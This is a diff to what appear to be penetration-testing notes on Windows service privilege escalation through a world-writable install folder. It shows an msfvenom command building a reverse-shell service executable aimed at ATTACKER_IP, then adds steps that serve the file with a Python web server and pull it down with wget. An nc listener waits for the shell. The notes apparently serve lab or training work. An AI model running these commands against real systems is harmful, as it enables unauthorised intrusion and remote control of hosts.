@@ -338,6 +338,7 @@ SERVICE_NAME: disk sorter enterprise
 * Some installers reduce permissions of installed folder.
 * Administrator may install service binaries in world-writable non-default path.
 * `c:\MyPrograms` inherits permissions of `C:\`.
+  * Any user can create files and folders. 
 ```
 icacls c:\MyPrograms
 c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
@@ -354,7 +355,15 @@ Successfully processed 1 files; Failed processing 0 files
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
 ```
-* Upload payload to target.
+* Serve payload through python webserver.
+```
+python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+* Pull payload from PowerShell.
+```
+wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc2.exe
+``` 
 * Start listener to receive reverse shell.
 ```
 nc -lvnp 4446
